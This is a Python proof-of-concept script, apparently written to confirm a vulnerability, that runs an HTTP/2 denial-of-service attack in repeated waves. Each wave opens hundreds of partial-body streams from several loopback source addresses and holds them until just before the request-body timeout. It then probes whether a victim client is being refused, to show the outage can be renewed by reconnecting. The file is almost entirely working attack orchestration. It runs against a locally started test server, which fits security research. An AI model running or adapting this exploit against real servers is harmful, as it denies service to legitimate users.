#!/usr/bin/env python3
"""P32 wave confirmation: each wave opens 256 partial-body streams, holds a
fresh victim refused for nearly the full 60-second request-body deadline, then
releases and repeats.  Demonstrates that the denial is renewable by reconnecting.
"""
import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import h2bodyhold


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--sources", type=int, default=4)
    ap.add_argument("--connections-per-source", type=int, default=2)
    ap.add_argument("--per-source", type=int, default=32)
    ap.add_argument("--waves", type=int, default=3)
    ap.add_argument("--hold-seconds", type=int, default=50)
    ap.add_argument("--probe-every", type=int, default=10)
    ap.add_argument("--release-wait", type=float, default=5.0)
    ap.add_argument("--path", default="/hold")
    args = ap.parse_args()

    h2bodyhold.setup()
    proc = h2bodyhold.start()
    try:
        print("baseline:", h2bodyhold.victim_probe(), flush=True)
        for wave in range(1, args.waves + 1):
            holders = []
            for i in range(args.sources):
                for _ in range(args.connections_per_source):
                    holders.append(h2bodyhold.BodyHolder(f"127.0.0.{i + 2}", args.per_source,
                                                          args.path))
            for h in holders:
                while h.open_one():
                    pass
            admitted = sum(len(h.active) for h in holders)
            time.sleep(1.0)
            for h in holders:
                h.drain()
            print(f"wave {wave} open: sent={admitted} "
                  f"active={sum(len(h.active) for h in holders)} "
                  f"408s={sum(h.total_408 for h in holders)} "
                  f"ended={sum(h.total_ended for h in holders)} "
                  f"resets={sum(h.total_reset for h in holders)} "
                  f"statuses={[h.statuses for h in holders]} "
                  f"victim={h2bodyhold.victim_probe()}", flush=True)
            start = time.time()
            next_probe = start
            while time.time() - start < args.hold_seconds:
                for h in holders:
                    h.drain()
                now = time.time()
                if now >= next_probe:
                    print(f"  wave {wave} t={int(now - start)}s "
                          f"active={sum(len(h.active) for h in holders)} "
                          f"ended={sum(h.total_ended for h in holders)} "
                          f"408s={sum(h.total_408 for h in holders)} "
                          f"resets={sum(h.total_reset for h in holders)} "
                          f"victim={h2bodyhold.victim_probe()}", flush=True)
                    next_probe += args.probe_every
                time.sleep(0.01)
            for h in holders:
                h.close()
            time.sleep(args.release_wait)
            print(f"wave {wave} released: "
                  f"victim={h2bodyhold.victim_probe()}", flush=True)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


if __name__ == "__main__":
    main()
